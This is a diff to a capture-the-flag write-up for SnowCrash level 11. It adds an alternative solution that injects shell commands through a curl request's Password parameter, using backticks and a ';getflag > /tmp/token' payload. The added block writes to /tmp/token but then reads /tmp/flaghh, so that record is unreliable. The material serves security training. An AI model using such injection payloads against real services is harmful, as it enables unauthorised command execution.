@@ -1,4 +1,4 @@
-#SnowCrash Level11
+# SnowCrash Level11
 
 Let's go ahead and cat that level11.lua :
 ```
@@ -107,4 +107,13 @@ level11@SnowCrash:~$ curl 'localhost:5151/?Password=`/*/*/EXPLOIT`'
 Password: Erf nope..
 level11@SnowCrash:~$ cat /tmp/flaghh
 Check flag.Here is your token : 
+```
+
+Alternative way to solve this challenge is simply a command injection in the pass variable, like the one before.
+Instead of searching for folders with right permissions just print flag.
+```
+level11@SnowCrash:~$ curl 'localhost:5151/?Password=";getflag > /tmp/token"'
+Password: Erf nope..
+level11@SnowCrash:~$ cat /tmp/flaghh
+Check flag.Here is your token :
 ```
